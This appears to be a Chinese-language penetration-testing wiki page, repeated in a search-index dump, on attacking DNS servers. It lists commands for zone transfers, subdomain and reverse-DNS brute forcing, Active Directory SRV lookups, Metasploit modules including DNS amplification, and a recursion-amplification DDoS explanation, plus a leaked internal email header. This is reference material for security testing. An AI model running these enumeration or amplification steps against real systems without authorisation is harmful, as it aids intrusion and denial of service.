Root Server DNS \u7684\u6839\u670d\u52a1\u5668\u8d1f\u8d23\u9876\u7ea7\u57df ( TLD )\u3002\u4f5c\u4e3a\u6700\u540e\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u53ea\u6709\u5728\u540d\u79f0\u670d\u52a1\u5668\u6ca1\u6709\u54cd\u5e94\u65f6\u624d\u4f1a\u8bf7\u6c42\u5b83\u4eec\u3002\u56e0\u6b64\uff0c\u6839\u670d\u52a1\u5668\u662f Internet \u4e0a\u7528\u6237\u548c\u5185\u5bb9\u4e4b\u95f4\u7684\u4e2d\u592e\u63a5\u53e3\uff0c\u56e0\u4e3a\u5b83\u94fe\u63a5\u57df\u548c IP \u5730\u5740\u3002\u4e92\u8054\u7f51 \u540d\u79f0\u4e0e\u6570\u5b57\u5730\u5740\u5206\u914d\u673a\u6784 ( ICANN ) \u8d1f\u8d23\u534f\u8c03\u6839\u540d\u79f0\u670d\u52a1\u5668\u7684\u5de5\u4f5c\u3002 13 \u5168\u7403\u90fd\u6709\u8fd9\u6837\u7684\u6839\u670d\u52a1\u5668\u3002 Authoritative Nameserver \u6743\u5a01\u540d\u79f0\u670d\u52a1\u5668\u62e5\u6709\u7279\u5b9a\u533a\u57df\u7684\u6743\u5a01\u3002\u4ed6\u4eec\u53ea\u56de\u7b54\u6765\u81ea\u5176\u804c\u8d23\u8303\u56f4\u5185\u7684\u8be2\u95ee\uff0c\u5e76\u4e14\u4ed6\u4eec\u7684\u4fe1\u606f\u5177\u6709\u7ea6\u675f\u529b\u3002\u5982\u679c\u6743\u5a01\u540d\u79f0\u670d\u52a1\u5668\u65e0\u6cd5\u56de\u7b54\u5ba2\u6237\u7aef\u7684\u67e5\u8be2\uff0c\u5219\u6839\u540d\u79f0\u670d\u52a1\u5668\u4f1a\u5728\u6b64\u65f6\u63a5\u7ba1\u3002 Non-authoritative Nameserver \u975e\u6743\u5a01\u540d\u79f0\u670d\u52a1\u5668\u4e0d\u8d1f\u8d23\u7279\u5b9a\u7684 DNS \u533a\u57df\u3002\u76f8\u53cd\uff0c\u4ed6\u4eec\u81ea\u5df1\u6536\u96c6\u6709\u5173\u7279\u5b9a DNS \u533a\u57df\u7684\u4fe1\u606f\uff0c\u8fd9\u662f\u4f7f\u7528\u9012\u5f52\u6216\u8fed\u4ee3 DNS \u67e5\u8be2\u5b8c\u6210\u7684\u3002 Caching DNS Server \u7f13\u5b58 DNS \u670d\u52a1\u5668\u5728\u6307\u5b9a\u65f6\u95f4\u6bb5\u5185\u7f13\u5b58\u6765\u81ea\u5176\u4ed6\u540d\u79f0\u670d\u52a1\u5668\u7684\u4fe1\u606f\u3002\u6743\u5a01\u540d\u79f0\u670d\u52a1\u5668\u51b3\u5b9a\u6b64\u5b58\u50a8\u7684\u6301\u7eed\u65f6\u95f4\u3002 Forwarding Server \u8f6c\u53d1\u670d\u52a1\u5668\u53ea\u6267\u884c\u4e00\u4e2a\u529f\u80fd\uff1a\u5b83\u4eec\u5c06 DNS \u67e5\u8be2\u8f6c\u53d1\u5230\u53e6\u4e00\u53f0 DNS \u670d\u52a1\u5668\u3002 Resolver \u89e3\u6790\u5668\u4e0d\u662f\u6743\u5a01\u7684 DNS \u670d\u52a1\u5668\uff0c\u800c\u662f\u5728\u8ba1\u7b97\u673a\u6216\u8def\u7531\u5668\u672c\u5730\u6267\u884c\u540d\u79f0\u89e3\u6790\u3002 \u679a\u4e3e Banner \u6293\u53d6 DNS \u6ca1\u6709\u53ef\u62a2\u7684\u201c\u65d7\u5e1c\u201d\u3002 version.bind. CHAOS TXT \u6700\u63a5\u8fd1\u7684\u7b49\u6548\u9879\u662f\u9002\u7528\u4e8e\u5927\u591a\u6570 BIND \u540d\u79f0\u670d\u52a1\u5668\u7684\u9b54\u672f\u67e5\u8be2\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u65b9\u5f0f\u6267\u884c\u6b64\u67e5\u8be2 dig \uff1a dig version.bind CHAOS TXT @DNS \u5982\u679c\u8fd9\u4e0d\u8d77\u4f5c\u7528\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u6307\u7eb9\u8bc6\u522b\u6280\u672f\u6765\u786e\u5b9a\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u7248\u672c\u2014\u2014\u8be5 fpdns \u5de5\u5177\u662f\u4e00\u79cd\u9009\u62e9\uff0c\u4f46\u8fd8\u6709\u5176\u4ed6\u9009\u62e9\u3002 \u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528nmap \u811a\u672c\u83b7\u53d6Banner\uff1a --script dns-nsid \u4efb\u4f55\u8bb0\u5f55 \u8bb0\u5f55 ANY \u5c06\u8981\u6c42 DNS \u670d\u52a1\u5668\u8fd4\u56de \u5b83 \u613f\u610f\u516c\u5f00\u7684 \u6240\u6709\u53ef\u7528 \u6761\u76ee \u3002 dig any victim.com @<DNS_IP> \u533a\u57df\u8f6c\u79fb \u6b64\u8fc7\u7a0b\u7f29\u5199\u4e3a Asynchronous Full Transfer Zone ( AXFR )\u3002 dig axfr @<DNS_IP> #\u8bd5\u56fe\u5728\u6ca1\u6709\u57df\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u533a\u57df\u8f6c\u79fb dig axfr @<DNS_IP> <DOMAIN> #\u8bd5\u56fe\u901a\u8fc7\u731c\u6d4b\u57df\u6765\u6267\u884c\u533a\u57df\u8f6c\u79fb fierce --domain <DOMAIN> --dns-servers <DNS_IP> #\u5982\u679c\u9488\u5bf9\u6bcf\u4e2a\u6388\u6743\u7684\u540d\u79f0\u670d\u52a1\u5668\u6267\u884c\u533a\u57df\u8f6c\u79fb\u4e0d\u8d77\u4f5c\u7528\uff0c\u5c06\u542f\u52a8\u5b57\u5178\u653b\u51fb \u66f4\u591a\u4fe1\u606f dig ANY @<DNS_IP> <DOMAIN> #\u4efb\u4f55\u4fe1\u606f dig A @<DNS_IP> <DOMAIN> #\u5e38\u89c4 DNS \u8bf7\u6c42 dig AAAA @<DNS_IP> <DOMAIN> #IPv6 DNS \u8bf7\u6c42 dig TXT @<DNS_IP> <DOMAIN> #\u4fe1\u606f dig MX @<DNS_IP> <DOMAIN> #\u7535\u5b50\u90ae\u4ef6\u6709\u5173\u7684\u5185\u5bb9 dig NS @<DNS_IP> <DOMAIN> #\u80fd\u591f\u89e3\u6790\u8be5\u540d\u79f0\u7684 DNS dig -x 192.168.0.2 @<DNS_IP> #\u53cd\u5411\u67e5\u627e dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #\u53cd\u5411 IPv6 \u67e5\u627e #Use [-p PORT] or -6 (to use ivp6 address of dns) \u4f7f\u7528 nslookup nslookup > SERVER <IP_DNS> #\u9009\u62e9 DNS \u670d\u52a1\u5668 > 127.0.0.1 #\u53ef\u80fd\u662f\u53cd\u5411\u67e5\u627e\u7684 127.0.0.1... > <IP_MACHINE> #\u53ef\u80fd\u662f\u53cd\u5411\u67e5\u627e\u7684\u4e00\u53f0\u673a\u5668... \u4f7f\u7528metasploit \u6a21\u5757 auxiliary/gather/enum_dns #Perform enumeration actions \u4f7f\u7528nmap \u811a\u672c #\u6267\u884c\u679a\u4e3e\u64cd\u4f5c nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" <IP> DNS \u53cd\u5411\u66b4\u529b\u7834\u89e3 dnsrecon -r 127.0.0.0/24 -n <IP_DNS> #\u6240\u6709\u5730\u5740\u7684 DNS \u53cd\u5411\u67e5\u8be2 dnsrecon -r 127.0.1.0/24 -n <IP_DNS> #\u6240\u6709\u5730\u5740\u7684 DNS \u53cd\u5411\u67e5\u8be2 dnsrecon -r <IP_DNS>/24 -n <IP_DNS> #\u6240\u6709\u5730\u5740\u7684 DNS \u53cd\u5411\u67e5\u8be2 dnsrecon -d active.htb -a -n <IP_DNS> #\u533a\u57df\u8f6c\u79fb \u5982\u679c\u60a8\u80fd\u591f\u627e\u5230\u89e3\u6790\u4e3a\u5185\u90e8 IP \u5730\u5740\u7684\u5b50\u57df\uff0c\u60a8\u5e94\u8be5\u5c1d\u8bd5\u5bf9\u8bf7\u6c42\u8be5 IP \u8303\u56f4\u7684\u57df\u7684 NS \u6267\u884c\u53cd\u5411 dns BF\u3002 \u53ef\u4ee5\u4f7f\u7528: https://github.com/amine7536/reverse-scan \u53ef\u4ee5\u67e5\u8be2\u53cd\u5411 IP https://bgp.he.net/net/205.166.76.0/24#_dns (\u6b64\u5de5\u5177\u5bf9 BGP \u4e5f\u5f88\u6709\u5e2e\u52a9). DNS - \u5b50\u57df\u540d\u66b4\u529b\u7834\u89e3 dnsenum --dnsserver <IP_DNS> --enum -p 0 -s 0 -o subdomains.txt -f subdomains-1000.txt <DOMAIN> dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <IP_DNS> dnscan -d <domain> -r -w subdomains-1000.txt #\u4ee5\u9012\u5f52\u65b9\u5f0f\u66b4\u529b\u731c\u6d4b\u5b50\u57df\u540d, https://github.com/rbsec/dnscan \u6d3b\u52a8\u76ee\u5f55\u670d\u52a1\u5668 dig -t _gc._tcp.lab.domain.com dig -t _ldap._tcp.lab.domain.com dig -t _kerberos._tcp.lab.domain.com dig -t _kpasswd._tcp.lab.domain.com nmap --script dns-srv-enum --script-args \"dns-srv-enum.domain='domain.com'\" DNS\u5b89\u5168 #\u67e5\u8be2 paypal \u5b50\u57df\u540d\u5230 ns3.isc-sns.info nmap -sSU -p53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=paypal.com ns3.isc-sns.info IPv6 \u4f7f\u7528 \u201cAAAA\u201d \u8bf7\u6c42\u66b4\u529b\u731c\u6d4b\u5b50\u57df\u540d\u7684 IPv6 \u5730\u5740 dnsdict6 -s -t <domain> \u4f7f\u7528 IPv6 \u5730\u5740\u66b4\u529b\u731c\u6d4b\u53cd\u5411 DNS dnsrevenum6 pri.authdns.ripe.net 2001:67c:2e8::/48 #Will use the dns pri.authdns.ripe.net DNS \u9012\u5f52 DDoS \u653b\u51fb \u5982\u679c \u542f\u7528 DNS \u9012\u5f52 \uff0c\u653b\u51fb\u8005\u53ef\u4ee5 \u6b3a\u9a97UDP \u6570\u636e\u5305 \u7684\u6765\u6e90 \uff0c\u4ee5\u4fbf\u4f7f DNS \u5c06\u54cd\u5e94\u53d1\u9001\u5230\u53d7\u5bb3\u670d\u52a1\u5668 \u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6ee5\u7528 ANY \u6216 DNSSEC \u8bb0\u5f55\u7c7b\u578b\uff0c\u56e0\u4e3a\u5b83\u4eec\u8fc7\u53bb\u5e38\u5e38\u6709\u66f4\u5927\u7684\u54cd\u5e94\u3002 \u68c0\u67e5 DNS \u662f\u5426\u652f\u6301 \u9012\u5f52\u7684 \u65b9\u6cd5\u662f\u67e5\u8be2\u57df\u540d\u5e76 \u68c0\u67e5 \u6807\u5fd7\u201cra\u201d \uff08 \u9012\u5f52\u53ef\u7528 \uff09\u662f\u5426\u5728\u54cd\u5e94\u4e2d\uff1a dig google.com A @<IP> \u4e0d\u53ef\u7528 : \u53ef\u7528 : \u90ae\u5bc4\u5230\u4e0d\u5b58\u5728\u7684\u5e10\u6237 \u51fa\u81ea\u4e66\u7c4d\uff1a\u7f51\u7edc\u5b89\u5168\u8bc4\u4f30\uff08\u7b2c 3 \u7248\uff09 \u7b80\u5355\u5730\u5411\u76ee\u6807\u57df\u4e2d\u4e0d\u5b58\u5728\u7684\u5730\u5740\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u901a\u5e38\u4f1a\u901a\u8fc7 \u672a\u9001\u8fbe\u901a\u77e5 (NDN) \u63ed\u793a\u6709\u7528\u7684\u5185\u90e8\u7f51\u7edc\u4fe1\u606f\u3002 Generating server: noa.nintendo.com blah@nintendo.com #550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ## Original message headers: Received: from ONERDEDGE02.one.nintendo.com (10.13.20.35) by onerdexch08.one.nintendo.com (10.13.30.39) with Microsoft SMTP Server (TLS) id 14.3.174.1; Sat, 26 Apr 2014 16:52:22 -0700 Received: from barracuda.noa.nintendo.com (205.166.76.35) by ONERDEDGE02.one.nintendo.com (10.13.20.35) with Microsoft SMTP Server (TLS) id 14.3.174.1; Sat, 26 Apr 2014 16:51:22 -0700 X-ASG-Debug-ID: 1398556333-0614671716199b0d0001-zOQ9WJ Received: from gateway05.websitewelcome.com (gateway05.websitewelcome.com [69.93.154.37]) by barracuda.noa.nintendo.com with ESMTP id xVNPkwaqGgdyH5Ag for <blah@nintendo.com>; Sat, 26 Apr 2014 16:52:13 -0700 (PDT) X-Barracuda-Envelope-From: chris@example.org X-Barracuda-Apparent-Source-IP: 69.93.154.37 \u4ee5\u4e0b\u8fd9\u6bb5\u6587\u5b57\u4e2d\u7684\u6570\u636e\u662f\u6709\u7528\u7684\uff1a \u5185\u90e8\u4e3b\u673a\u540d\u3001IP \u5730\u5740\u548c\u5b50\u57df\u5e03\u5c40 \u90ae\u4ef6\u670d\u52a1\u5668\u6b63\u5728\u8fd0\u884c Microsoft Exchange Server 2010 SP3 \u68ad\u5b50\u9c7c\u7f51\u7edc\u8bbe\u5907\u7528\u4e8e\u6267\u884c\u5185\u5bb9\u8fc7\u6ee4 \u914d\u7f6e\u6587\u4ef6 host.conf /etc/resolv.conf /etc/bind/named.conf /etc/bind/named.conf.local /etc/bind/named.conf.options /etc/bind/named.conf.log /etc/bind/* \u914d\u7f6e\u7ed1\u5b9a\u670d\u52a1\u5668\u65f6\u7684\u5371\u9669\u8bbe\u7f6e\uff1a \u9009\u9879 \u63cf\u8ff0 allow-query \u5b9a\u4e49\u5141\u8bb8\u54ea\u4e9b\u4e3b\u673a\u5411 DNS \u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u3002 allow-recursion \u5b9a\u4e49\u5141\u8bb8\u54ea\u4e9b\u4e3b\u673a\u5411 DNS \u670d\u52a1\u5668\u53d1\u9001\u9012\u5f52\u8bf7\u6c42\u3002 allow-transfer \u5b9a\u4e49\u5141\u8bb8\u54ea\u4e9b\u4e3b\u673a\u4ece DNS \u670d\u52a1\u5668\u63a5\u6536\u533a\u57df\u4f20\u8f93\u3002 zone-statistics \u6536\u96c6\u533a\u57df\u7684\u7edf\u8ba1\u6570\u636e\u3002 \u81ea\u52a8\u5316\u547d\u4ee4 Protocol_Name: DNS #\u534f\u8bae\u7684\u7f29\u5199\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09\u3002 Port_Number: 53 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u7528\u9017\u53f7\u9694\u5f00 Protocol_Description: Domain Name Service #\u534f\u8bae\u7684\u7f29\u5199\u62fc\u5199\u51fa\u6765 Entry_1: Name: Notes Description: Notes for DNS Note: | #These are the commands I run every time I see an open DNS port dnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name} dnsrecon -r 127.0.1.0/24 -n {IP} -d {Domain_Name} dnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name} dig axfr @{IP} dig axfr {Domain_Name} @{IP} nslookup SERVER {IP} 127.0.0.1 {IP} Domain_Name exit Entry_2: Name: Banner Grab Description: Grab DNS Banner Command: dig version.bind CHAOS TXT @DNS Entry_3: Name: Nmap Vuln Scan Description: Scan for Vulnerabilities with Nmap Command: nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" {IP} Entry_4: Name: Zone Transfer Description: Three attempts at forcing a zone transfer Command: dig axfr @{IP} && dix axfr @{IP} {Domain_Name} && fierce -dns {Domain_Name} Entry_5: Name: Active Directory Description: Eunuerate a DC via DNS Command: dig -t _gc._{Domain_Name} && dig -t _ldap._{Domain_Name} && dig -t _kerberos._{Domain_Name} && dig -t _kpasswd._{Domain_Name} && nmap --script dns-srv-enum --script-args \"dns-srv-enum.domain={Domain_Name}\" Entry_6: Name: consolesless mfs enumeration Description: DNS enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/dns/dns_amp; set RHOSTS {IP}; set RPORT 53; run; exit' && msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS {IP}; set RPORT 53; run; exit'","title":"53 - DNS \u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"\u57df\u540d\u7cfb\u7edf (DNS) \u662f Internet \u7684\u7535\u8bdd\u7c3f\u3002\u4eba\u4eec\u901a\u8fc7\u57df\u540d\u5728\u7ebf\u8bbf\u95ee\u4fe1\u606f\uff0c\u4f8b\u5982 nytimes.com \u6216 espn.com\u3002Web \u6d4f\u89c8\u5668\u901a\u8fc7 Internet \u534f\u8bae (IP) \u5730\u5740\u8fdb\u884c\u4ea4\u4e92\u3002DNS \u5c06\u57df\u540d\u8f6c\u6362\u4e3a IP \u5730\u5740 \uff0c\u4ee5\u4fbf\u6d4f\u89c8\u5668\u53ef\u4ee5\u52a0\u8f7d Internet \u8d44\u6e90\u3002 \u9ed8\u8ba4\u7aef\u53e3: 53 PORT STATE SERVICE REASON 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) 5353/udp open zeroconf udp-response 53/udp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#dns","text":"\u4fe1\u606f\u6765\u81ea https://academy.hackthebox.com/module/112/section/1069 \u670d\u52a1\u5668\u7c7b\u578b \u63cf\u8ff0 DNS Root Server DNS \u7684\u6839\u670d\u52a1\u5668\u8d1f\u8d23\u9876\u7ea7\u57df ( TLD )\u3002\u4f5c\u4e3a\u6700\u540e\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u53ea\u6709\u5728\u540d\u79f0\u670d\u52a1\u5668\u6ca1\u6709\u54cd\u5e94\u65f6\u624d\u4f1a\u8bf7\u6c42\u5b83\u4eec\u3002\u56e0\u6b64\uff0c\u6839\u670d\u52a1\u5668\u662f Internet \u4e0a\u7528\u6237\u548c\u5185\u5bb9\u4e4b\u95f4\u7684\u4e2d\u592e\u63a5\u53e3\uff0c\u56e0\u4e3a\u5b83\u94fe\u63a5\u57df\u548c IP \u5730\u5740\u3002\u4e92\u8054\u7f51 \u540d\u79f0\u4e0e\u6570\u5b57\u5730\u5740\u5206\u914d\u673a\u6784 ( ICANN ) \u8d1f\u8d23\u534f\u8c03\u6839\u540d\u79f0\u670d\u52a1\u5668\u7684\u5de5\u4f5c\u3002 13 \u5168\u7403\u90fd\u6709\u8fd9\u6837\u7684\u6839\u670d\u52a1\u5668\u3002 Authoritative Nameserver \u6743\u5a01\u540d\u79f0\u670d\u52a1\u5668\u62e5\u6709\u7279\u5b9a\u533a\u57df\u7684\u6743\u5a01\u3002\u4ed6\u4eec\u53ea\u56de\u7b54\u6765\u81ea\u5176\u804c\u8d23\u8303\u56f4\u5185\u7684\u8be2\u95ee\uff0c\u5e76\u4e14\u4ed6\u4eec\u7684\u4fe1\u606f\u5177\u6709\u7ea6\u675f\u529b\u3002\u5982\u679c\u6743\u5a01\u540d\u79f0\u670d\u52a1\u5668\u65e0\u6cd5\u56de\u7b54\u5ba2\u6237\u7aef\u7684\u67e5\u8be2\uff0c\u5219\u6839\u540d\u79f0\u670d\u52a1\u5668\u4f1a\u5728\u6b64\u65f6\u63a5\u7ba1\u3002 Non-authoritative Nameserver \u975e\u6743\u5a01\u540d\u79f0\u670d\u52a1\u5668\u4e0d\u8d1f\u8d23\u7279\u5b9a\u7684 DNS \u533a\u57df\u3002\u76f8\u53cd\uff0c\u4ed6\u4eec\u81ea\u5df1\u6536\u96c6\u6709\u5173\u7279\u5b9a DNS \u533a\u57df\u7684\u4fe1\u606f\uff0c\u8fd9\u662f\u4f7f\u7528\u9012\u5f52\u6216\u8fed\u4ee3 DNS \u67e5\u8be2\u5b8c\u6210\u7684\u3002 Caching DNS Server \u7f13\u5b58 DNS \u670d\u52a1\u5668\u5728\u6307\u5b9a\u65f6\u95f4\u6bb5\u5185\u7f13\u5b58\u6765\u81ea\u5176\u4ed6\u540d\u79f0\u670d\u52a1\u5668\u7684\u4fe1\u606f\u3002\u6743\u5a01\u540d\u79f0\u670d\u52a1\u5668\u51b3\u5b9a\u6b64\u5b58\u50a8\u7684\u6301\u7eed\u65f6\u95f4\u3002 Forwarding Server \u8f6c\u53d1\u670d\u52a1\u5668\u53ea\u6267\u884c\u4e00\u4e2a\u529f\u80fd\uff1a\u5b83\u4eec\u5c06 DNS \u67e5\u8be2\u8f6c\u53d1\u5230\u53e6\u4e00\u53f0 DNS \u670d\u52a1\u5668\u3002 Resolver \u89e3\u6790\u5668\u4e0d\u662f\u6743\u5a01\u7684 DNS \u670d\u52a1\u5668\uff0c\u800c\u662f\u5728\u8ba1\u7b97\u673a\u6216\u8def\u7531\u5668\u672c\u5730\u6267\u884c\u540d\u79f0\u89e3\u6790\u3002","title":"\u4e0d\u540c\u7684 DNS \u670d\u52a1\u5668"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"","title":"\u679a\u4e3e"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#banner","text":"DNS \u6ca1\u6709\u53ef\u62a2\u7684\u201c\u65d7\u5e1c\u201d\u3002 version.bind. CHAOS TXT \u6700\u63a5\u8fd1\u7684\u7b49\u6548\u9879\u662f\u9002\u7528\u4e8e\u5927\u591a\u6570 BIND \u540d\u79f0\u670d\u52a1\u5668\u7684\u9b54\u672f\u67e5\u8be2\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u65b9\u5f0f\u6267\u884c\u6b64\u67e5\u8be2 dig \uff1a dig version.bind CHAOS TXT @DNS \u5982\u679c\u8fd9\u4e0d\u8d77\u4f5c\u7528\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u6307\u7eb9\u8bc6\u522b\u6280\u672f\u6765\u786e\u5b9a\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u7248\u672c\u2014\u2014\u8be5 fpdns \u5de5\u5177\u662f\u4e00\u79cd\u9009\u62e9\uff0c\u4f46\u8fd8\u6709\u5176\u4ed6\u9009\u62e9\u3002 \u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528nmap \u811a\u672c\u83b7\u53d6Banner\uff1a --script dns-nsid","title":"Banner \u6293\u53d6"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"\u8bb0\u5f55 ANY \u5c06\u8981\u6c42 DNS \u670d\u52a1\u5668\u8fd4\u56de \u5b83 \u613f\u610f\u516c\u5f00\u7684 \u6240\u6709\u53ef\u7528 \u6761\u76ee \u3002 dig any victim.com @<DNS_IP>","title":"\u4efb\u4f55\u8bb0\u5f55"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_4","text":"\u6b64\u8fc7\u7a0b\u7f29\u5199\u4e3a Asynchronous Full Transfer Zone ( AXFR )\u3002 dig axfr @<DNS_IP> #\u8bd5\u56fe\u5728\u6ca1\u6709\u57df\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u533a\u57df\u8f6c\u79fb dig axfr @<DNS_IP> <DOMAIN> #\u8bd5\u56fe\u901a\u8fc7\u731c\u6d4b\u57df\u6765\u6267\u884c\u533a\u57df\u8f6c\u79fb fierce --domain <DOMAIN> --dns-servers <DNS_IP> #\u5982\u679c\u9488\u5bf9\u6bcf\u4e2a\u6388\u6743\u7684\u540d\u79f0\u670d\u52a1\u5668\u6267\u884c\u533a\u57df\u8f6c\u79fb\u4e0d\u8d77\u4f5c\u7528\uff0c\u5c06\u542f\u52a8\u5b57\u5178\u653b\u51fb","title":"\u533a\u57df\u8f6c\u79fb"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_5","text":"dig ANY @<DNS_IP> <DOMAIN> #\u4efb\u4f55\u4fe1\u606f dig A @<DNS_IP> <DOMAIN> #\u5e38\u89c4 DNS \u8bf7\u6c42 dig AAAA @<DNS_IP> <DOMAIN> #IPv6 DNS \u8bf7\u6c42 dig TXT @<DNS_IP> <DOMAIN> #\u4fe1\u606f dig MX @<DNS_IP> <DOMAIN> #\u7535\u5b50\u90ae\u4ef6\u6709\u5173\u7684\u5185\u5bb9 dig NS @<DNS_IP> <DOMAIN> #\u80fd\u591f\u89e3\u6790\u8be5\u540d\u79f0\u7684 DNS dig -x 192.168.0.2 @<DNS_IP> #\u53cd\u5411\u67e5\u627e dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #\u53cd\u5411 IPv6 \u67e5\u627e #Use [-p PORT] or -6 (to use ivp6 address of dns)","title":"\u66f4\u591a\u4fe1\u606f"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#nslookup","text":"nslookup > SERVER <IP_DNS> #\u9009\u62e9 DNS \u670d\u52a1\u5668 > 127.0.0.1 #\u53ef\u80fd\u662f\u53cd\u5411\u67e5\u627e\u7684 127.0.0.1... > <IP_MACHINE> #\u53ef\u80fd\u662f\u53cd\u5411\u67e5\u627e\u7684\u4e00\u53f0\u673a\u5668...","title":"\u4f7f\u7528 nslookup"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#metasploit","text":"auxiliary/gather/enum_dns #Perform enumeration actions","title":"\u4f7f\u7528metasploit \u6a21\u5757"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#nmap","text":"#\u6267\u884c\u679a\u4e3e\u64cd\u4f5c nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" <IP>","title":"\u4f7f\u7528nmap \u811a\u672c"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#dns_1","text":"dnsrecon -r 127.0.0.0/24 -n <IP_DNS> #\u6240\u6709\u5730\u5740\u7684 DNS \u53cd\u5411\u67e5\u8be2 dnsrecon -r 127.0.1.0/24 -n <IP_DNS> #\u6240\u6709\u5730\u5740\u7684 DNS \u53cd\u5411\u67e5\u8be2 dnsrecon -r <IP_DNS>/24 -n <IP_DNS> #\u6240\u6709\u5730\u5740\u7684 DNS \u53cd\u5411\u67e5\u8be2 dnsrecon -d active.htb -a -n <IP_DNS> #\u533a\u57df\u8f6c\u79fb \u5982\u679c\u60a8\u80fd\u591f\u627e\u5230\u89e3\u6790\u4e3a\u5185\u90e8 IP \u5730\u5740\u7684\u5b50\u57df\uff0c\u60a8\u5e94\u8be5\u5c1d\u8bd5\u5bf9\u8bf7\u6c42\u8be5 IP \u8303\u56f4\u7684\u57df\u7684 NS \u6267\u884c\u53cd\u5411 dns BF\u3002 \u53ef\u4ee5\u4f7f\u7528: https://github.com/amine7536/reverse-scan \u53ef\u4ee5\u67e5\u8be2\u53cd\u5411 IP https://bgp.he.net/net/205.166.76.0/24#_dns (\u6b64\u5de5\u5177\u5bf9 BGP \u4e5f\u5f88\u6709\u5e2e\u52a9).","title":"DNS \u53cd\u5411\u66b4\u529b\u7834\u89e3"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#dns-","text":"dnsenum --dnsserver <IP_DNS> --enum -p 0 -s 0 -o subdomains.txt -f subdomains-1000.txt <DOMAIN> dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <IP_DNS> dnscan -d <domain> -r -w subdomains-1000.txt #\u4ee5\u9012\u5f52\u65b9\u5f0f\u66b4\u529b\u731c\u6d4b\u5b50\u57df\u540d, https://github.com/rbsec/dnscan","title":"DNS - \u5b50\u57df\u540d\u66b4\u529b\u7834\u89e3"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_6","text":"dig -t _gc._tcp.lab.domain.com dig -t _ldap._tcp.lab.domain.com dig -t _kerberos._tcp.lab.domain.com dig -t _kpasswd._tcp.lab.domain.com nmap --script dns-srv-enum --script-args \"dns-srv-enum.domain='domain.com'\"","title":"\u6d3b\u52a8\u76ee\u5f55\u670d\u52a1\u5668"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#dns_2","text":"#\u67e5\u8be2 paypal \u5b50\u57df\u540d\u5230 ns3.isc-sns.info nmap -sSU -p53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=paypal.com ns3.isc-sns.info","title":"DNS\u5b89\u5168"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#ipv6","text":"\u4f7f\u7528 \u201cAAAA\u201d \u8bf7\u6c42\u66b4\u529b\u731c\u6d4b\u5b50\u57df\u540d\u7684 IPv6 \u5730\u5740 dnsdict6 -s -t <domain> \u4f7f\u7528 IPv6 \u5730\u5740\u66b4\u529b\u731c\u6d4b\u53cd\u5411 DNS dnsrevenum6 pri.authdns.ripe.net 2001:67c:2e8::/48 #Will use the dns 